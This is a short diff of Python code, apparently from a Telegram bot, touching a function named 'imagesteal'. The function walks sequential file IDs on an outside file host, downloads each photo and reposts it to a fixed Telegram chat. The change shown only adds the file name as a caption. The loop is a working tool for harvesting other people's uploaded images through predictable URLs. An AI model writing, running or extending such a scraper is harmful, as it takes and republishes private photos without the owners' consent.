@@ -96,7 +96,6 @@ def imagesteal(message):
 	a = 1042120
 	while a > 0:
 		try:
-		
 			url = str("http://xn--m38h.ml/tgFile/?l=photos/file_"+str(a)+".jpg")
 			path = str("file_"+str(a)+".jpg")
 			response = requests.get(url)
@@ -107,7 +106,7 @@ def imagesteal(message):
 				time.sleep(1)
 				if img is not None:
 					type(img)
-					bot.send_photo(-1001452022332,img)
+					bot.send_photo(-1001452022332,img,caption=path)
 					a-=1
 				   
 		except Exception as e:
